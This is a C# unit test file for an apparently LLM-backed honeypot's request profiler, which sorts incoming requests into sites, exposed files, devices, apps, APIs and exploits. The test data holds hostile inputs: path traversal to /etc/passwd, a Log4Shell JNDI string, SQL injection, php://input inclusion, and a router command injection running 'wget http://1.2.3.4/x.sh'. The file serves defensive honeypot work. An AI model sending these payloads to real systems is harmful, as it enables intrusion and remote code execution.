using Honeyslop.Worker.Llm;

namespace Honeyslop.Worker.Tests.Llm;

[TestClass]
public sealed class RequestProfilerTests
{
    [TestMethod]
    [DataRow("vorobalek.dev", "/", ResponseKind.Site, "the home page of the website vorobalek.dev, served by {web}", "{web}", false)]
    [DataRow("203.0.113.7", "/", ResponseKind.Site, "the default page of a freshly installed web server at 203.0.113.7, served by {web}", "{web}", false)]
    [DataRow("shop.test", "/.git/HEAD", ResponseKind.File, "the file /.git/HEAD, readable on the website shop.test, served by {web}", "{web}", false)]
    [DataRow("shop.test", "/Backup/DB.sql", ResponseKind.File, "the file /Backup/DB.sql on the website shop.test, served by {web}", "{web}", true)]
    [DataRow("shop.test", "/catalog/shoes?page=2", ResponseKind.Site, "the page /catalog/shoes of the website shop.test, served by {web}", "{web}", true)]
    [DataRow("203.0.113.7", "/HNAP1/", ResponseKind.Device, "D-Link DIR-850L home router, HNAP interface", "Linux, HTTP/1.1, DIR-850L Ver 1.13", false)]
    [DataRow("203.0.113.7", "/ISAPI/System/deviceInfo", ResponseKind.Device, "Hikvision IP camera, ISAPI interface", "App-webs/", false)]
    [DataRow("203.0.113.7", "/boaform/admin/formLogin", ResponseKind.App, "Realtek-based home router web interface", "Boa/0.94.14rc21", false)]
    [DataRow("blog.test", "/wp-login.php", ResponseKind.App, "WordPress 5", "{web}", false)]
    [DataRow("blog.test", "/wp-content/plugins/hellopress/wp_filemanager.php", ResponseKind.App, "WordPress plugin hellopress", "{web}", false)]
    [DataRow("blog.test", "/wp-admin/install.php", ResponseKind.App, "WordPress installer, first step", "{web}", false)]
    [DataRow("ci.test", "/manager/html", ResponseKind.App, "Apache Tomcat Manager", "Apache-Coyote/1.1", false)]
    [DataRow("85.10.202.87", "/ews/exchange.asmx", ResponseKind.Api, "Microsoft Exchange Web Services", "Microsoft-IIS/8.5", false)]
    [DataRow("shop.test", "/admin", ResponseKind.App, "the login page of the website shop.test, served by {web}", "{web}", false)]
    [DataRow("api.test", "/actuator/env", ResponseKind.Api, "Spring Boot Actuator", "", false)]
    [DataRow("203.0.113.7", "/v2/_catalog", ResponseKind.Api, "Docker Registry HTTP API v2", "", false)]
    [DataRow("shop.test", "/api/orders/7", ResponseKind.Api, "the JSON API of the website shop.test, served by {web}", "{web}", false)]
    [DataRow("shop.test", "/.env", ResponseKind.File, "the file /.env, readable on the website shop.test, served by {web}", "{web}", false)]
    [DataRow("203.0.113.7", "/cgi-bin/.env", ResponseKind.File, "the file /cgi-bin/.env, readable on the web server at 203.0.113.7, served by {web}", "{web}", false)]
    [DataRow("blog.test", "/wp-config.php.bak", ResponseKind.File, "the file /wp-config.php.bak, readable on the website blog.test, served by {web}", "{web}", false)]
    [DataRow("shop.test", "/backup/db.sql", ResponseKind.File, "the file /backup/db.sql on the website shop.test, served by {web}", "{web}", true)]
    [DataRow("shop.test", "/download?file=../../etc/passwd", ResponseKind.Exploit, "the website shop.test, served by {web}, and the response is the raw content of the file the request names", "{web}", false)]
    [DataRow("shop.test", "/?x=%24%7Bjndi%3Aldap%3A%2F%2F1.2.3.4%2Fa%7D", ResponseKind.Exploit, "the website shop.test, served by {web}, and the response is its usual page", "{web}", false)]
    [DataRow("shop.test", "/item?id=1' or '1'='1", ResponseKind.Exploit, "the website shop.test, served by {web}, and the response contains the database rows the SQL in the request selects", "{web}", false)]
    [DataRow("shop.test", "/index.php?page=php://input", ResponseKind.Exploit, "the website shop.test, served by {web}, and the response contains the output of the PHP code in the request", "{web}", false)]
    public void Profile_NamesTheKindTheSoftwareAndTheServer(string host, string target, ResponseKind kind, string subject, string server, bool refusable)
    {
        var web = RequestProfiler.WebServer(host);

        Assert.AreEqual(new RequestProfile(kind, subject.Replace("{web}", web), server.Replace("{web}", web), refusable), RequestProfiler.Profile(host, target, null));
    }

    [TestMethod]
    [DataRow("/k3j4h5x9.txt", "the file /k3j4h5x9.txt on the website shop.test, served by {web}")]
    [DataRow("/.git/index", "the file /.git/index on the website shop.test, served by {web}")]
    [DataRow("/.git/objects/3f/4a9c2e7b1d0f5a6c8e9b2d4f1a3c5e7b9d0f2a4c", "the file /.git/objects/3f/4a9c2e7b1d0f5a6c8e9b2d4f1a3c5e7b9d0f2a4c on the website shop.test, served by {web}")]
    [DataRow("/.DS_Store", "the file /.DS_Store on the website shop.test, served by {web}")]
    [DataRow("/data/app.sqlite", "the file /data/app.sqlite on the website shop.test, served by {web}")]
    public void Profile_RandomOrBinaryFile_MayBeRefused(string target, string subject)
    {
        var web = RequestProfiler.WebServer("shop.test");

        Assert.AreEqual(new RequestProfile(ResponseKind.File, subject.Replace("{web}", web), web, true), RequestProfiler.Profile("shop.test", target, null));
    }

    [TestMethod]
    public void Profile_CommandInTheBodyOfAKnownDevice_KeepsTheDeviceAndItsServer()
    {
        var profile = RequestProfiler.Profile("203.0.113.7", "/boaform/admin/formPing", "target_addr=;wget http://1.2.3.4/x.sh");

        Assert.AreEqual(new RequestProfile(ResponseKind.Exploit, "Realtek-based home router web interface, and the response contains the output of the shell command in the request", "Boa/0.94.14rc21", false), profile);
    }

    [TestMethod]
    public void Profile_EmbeddedDevice_RunsOnAnEmbeddedServer()
    {
        var server = RequestProfiler.Profile("203.0.113.7", "/cgi-bin/status.cgi", null).Server;

        Assert.DoesNotContain("Apache", server);
        Assert.DoesNotContain("IIS", server);
        Assert.DoesNotContain("nginx", server);
    }

    [TestMethod]
    public void WebServer_KeepsAHostOnOneServer_AndSpreadsHostsOverMany()
    {
        string[] servers = [.. Enumerable.Range(0, 200).Select(x => RequestProfiler.WebServer($"site{x}.test"))];

        Assert.AreEqual(RequestProfiler.WebServer("Shop.Test"), RequestProfiler.WebServer("shop.test"));
        Assert.IsGreaterThan(14, servers.Distinct().Count());
        Assert.IsLessThan(40, servers.GroupBy(x => x).Max(x => x.Count()));
    }
}